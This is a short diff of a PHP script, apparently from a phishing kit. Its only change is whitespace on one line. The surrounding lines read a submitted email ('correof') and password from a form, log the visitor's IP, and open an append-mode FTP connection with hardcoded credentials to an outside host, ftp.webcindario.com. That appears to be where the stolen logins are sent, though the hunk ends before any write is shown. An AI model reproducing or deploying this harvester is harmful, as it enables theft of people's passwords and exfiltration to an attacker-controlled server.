@@ -1,6 +1,6 @@
 <?php
 
-$correof = $_POST['correof'];
+$correof = $_POST[ 'correof' ];
 $pass = $_POST['pass'];
 $ip = $_SERVER['REMOTE_ADDR']; 
 $f = fopen("ftp://instapass20:codetek10@ftp.webcindario.com/web/index.html", "a"); 
